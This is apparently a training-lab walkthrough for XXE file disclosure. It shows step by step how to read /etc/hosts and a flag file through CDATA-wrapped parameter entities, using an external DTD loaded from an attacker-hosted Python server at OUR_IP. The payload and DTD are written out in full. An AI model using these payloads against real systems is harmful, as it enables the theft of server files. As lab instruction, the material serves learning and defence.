# Advanced File Disclosure

#### Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').



**Step 1** - Get the XML data

* Fill the form click on **Send Message**.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Capture the POST Request and send it with Repeater

<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

Like the last exercise, we can see the value of the tag `email`  being reflected on the Response. This time to extract the data, we'll wrap the content of the external file reference with a `CDATA` .

Since XML prevents joining internal and external entities, we have to come around with a solution. To bypass this limitation we can use `XML Parameter Entities`. This is a special type of entity that starts with `%` character and con only be used with DTD.

To do that lets create a file in our working environment call it **xxe.dtd**. File content:

```bash
<!ENTITY joined "%begin;%file;%end;">
```

Then in the same directory we start a python server:

```bash
python3 -m http.server 8000
```

Lets add our XML code and try to read a common file like the **etc/hosts**:

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> 
  <!ENTITY % file SYSTEM "file:///etc/hosts"> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
  %xxe;
]>
```

Make sure to add your machine IP, and add the **\&joined,** reference to the email tags.

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

As we can see, we retrieve the content of the **/etc/hosts** and we even got the logs on the attack machine.

Now, if you struggle to find the flag.php file, maybe it's because you were looking at the `var/www/html` directory. But the file is actually located at the root, so we have to reference it like this `file:///flag.php`

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

And if we send the POST Request we are able to read the **flag.php** file and retrieve the flag!

